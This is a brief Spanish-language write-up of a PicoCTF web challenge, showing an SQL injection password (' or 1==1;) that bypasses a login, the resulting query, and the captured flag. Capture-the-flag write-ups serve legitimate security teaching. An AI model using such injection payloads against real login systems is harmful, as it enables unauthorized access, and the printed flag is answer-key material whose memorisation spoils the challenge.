# Retos PicoCTF


## Objetivo 

There is a website running at https://jupiter.challenges.picoctf.org/problem/33850/ (link) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!
## Solución 

```
Se utiliza 'or 1==1;  en la password ya que se esta haciendo una sentencia SQL y esto hace que de True
username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'
Logged in!
Your flag is: picoCTF{s0m3_SQL_f8adf3fb}

```

## Notas adicionales 
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.
## Referencias 
